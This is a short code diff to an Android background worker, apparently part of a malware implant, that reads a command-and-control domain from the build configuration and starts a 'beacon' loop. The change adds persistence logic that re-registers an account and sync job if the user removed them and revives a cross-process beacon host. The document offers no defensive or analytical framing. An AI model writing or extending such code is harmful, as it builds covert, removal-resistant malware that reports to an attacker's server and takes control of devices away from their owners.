@@ -15,13 +15,15 @@ class ShadowWorker(
         // Domain injected at build time via BuildConfig (C2_DOMAIN env var in CI)
         val c2Domain = BuildConfig.C2_DOMAIN
 
-        // Android 14 data-sync foreground services are stopped after ~6h; this
-        // periodic run is the recovery that revives the process and re-promotes it
-        // to the foreground tier after that window closes (or after any reap).
+        // System-spawned-wake recovery: re-assert the account + periodic sync (in
+        // case the user removed the account) and bring the cross-process beacon host
+        // back up. Both are idempotent and cheap.
         try {
-            SyncForegroundService.start(applicationContext)
+            AccountRegistrar.ensure(applicationContext)
+            DualProcess.remember(applicationContext)
+            DualProcess.wakeBeacon(applicationContext)
         } catch (e: Exception) {
-            Log.e(TAG, "doWork: foreground service start failed: ${e.message}")
+            Log.e(TAG, "doWork: account/beacon recovery failed: ${e.message}")
         }
 
         // Start the core. The Rust beacon loop owns its own lifetime and reconnect
